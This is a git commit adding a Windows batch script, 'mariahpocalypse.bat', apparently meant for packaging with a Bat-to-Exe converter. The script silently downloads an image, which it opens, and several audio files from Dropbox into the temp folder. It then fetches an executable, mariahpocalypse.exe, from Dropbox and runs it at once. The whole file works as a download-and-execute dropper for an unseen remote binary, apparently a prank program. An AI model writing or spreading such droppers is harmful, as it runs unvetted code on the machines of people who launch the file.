fee688a7f1cae5d033642b733a74fb2a0fffd9bb
girlwholeft <136718160+girlwholeft@users.noreply.github.com>
2024-11-15 12:57:56 -0500

    Add files via upload

---
+++ mariahpocalypse.bat
@@ -0,0 +1,45 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCuDJE2Q5EYgKQtRXkqLP2Ta
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCuDJE2Q5EYgKQtRXlXRbTjrVeRPubuqvKSCukh9
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/n1gpikb87fvwsv3bx4uc2/ttpdpaper.jpg?rlkey=upe3ao99ydyyyu0ogeza08b1k&st=j7xskure&dl=1' -OutFile .\ttpdpaper.jpg"
+start ttpdpaper.jpg
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/d7rm88411iamm67soji3f/youtube_-Q6xx0JfMBI_audio.mp3?rlkey=pda19yxn1r3cqq26gzkkw3xis&st=7ic4eike&dl=1' -OutFile file1.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/mldsfqz2j6mcbleei2d1x/youtube_4iusJui-BxM_audio.mp3?rlkey=ao0n7yv8fmhr66el6ugwowpld&st=sadtmd3d&dl=1' -OutFile file2.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ayswnbyq45slqhg5muk1q/youtube_CqBtS6BIP1E_audio.mp3?rlkey=rat1kez6nhelyob1182n936gw&st=grrv97m0&dl=1' -OutFile file3.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/8cc392l8ft59jmpqnxbzg/youtube_FkDpwF6-QiA_audio.mp3?rlkey=g6s5zwhmukhzfzlm6ypyzh6cz&st=2vkb7nwg&dl=1' -OutFile file5.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/hfle0zxfl2bj1wq38gn9r/youtube_Li6vpAMmfw0_audio.mp3?rlkey=pkhfm1mt1qc5l0j4nqtxbbj8f&st=xtmkl0qg&dl=1' -OutFile file7.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/miqko7n0zgpyziov8bwaw/youtube_LKaXY4IdZ40_audio.mp3?rlkey=7z4lnmu0bryoofaahwwq7ikom&st=9jjwazrl&dl=1' -OutFile file8.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/br0lonzdskbxn4wksnv5e/youtube_yU1knfz15xI_audio.mp3?rlkey=2rrp8xwag3h09q9vk5977axgc&st=y9qp7p3k&dl=1' -OutFile file11.mp3"
+Powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/21qe8ytkzikh1nlk24ak3/mariahpocalypseslow.exe?rlkey=trd3l5zcwf7nyzkfivdlzq4av&st=8004lv9n&dl=1' -OutFile .\mariahpocalypse.exe"
+mariahpocalypse.exe
